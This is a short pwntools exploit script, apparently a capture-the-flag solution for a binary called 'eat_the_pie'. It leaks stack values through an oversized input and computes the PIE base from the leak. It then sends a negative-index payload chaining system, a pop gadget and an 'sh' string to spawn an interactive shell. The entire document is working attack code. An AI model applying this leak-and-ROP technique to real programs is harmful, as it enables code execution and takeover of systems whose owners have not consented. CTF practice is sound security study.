from pwn import *
context.log_level = 'debug'


p = process('./eat_the_pie')
e = ELF('./eat_the_pie')

# leak?
print p.sendlineafter("> ", "1000000000000000000000000000000000000")
p.recvuntil("1000000000000000")

leak = []
while True:
    tmp = u32(p.recv(4))
    log.info(hex(tmp))
    leak.append(tmp)
    if (tmp == 0x7fffffff): break

# code_base4
code_base = leak[0]-0x74d
log.info('code@base : '+hex(code_base))

# rop
# 0x00000a98 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# pppr = 0xa9c
pppr = code_base + 0xa99
log.info('pop*3+ret : '+hex(pppr))

# system
system = code_base + e.sym['system']
log.info('system@addr : '+ hex(system))

fflush_str = 0x316
sh = code_base + fflush_str + 4 # "sh"
log.info("sh : " +hex(sh))

# payload
pl = "-2\x00\x00"
pl += p32(system)
pl += p32(pppr)
pl += p32(sh)

pause()
p.sendafter("> ",pl)
pause()
p.interactive()



# func1 => func1+0x69 (ret)
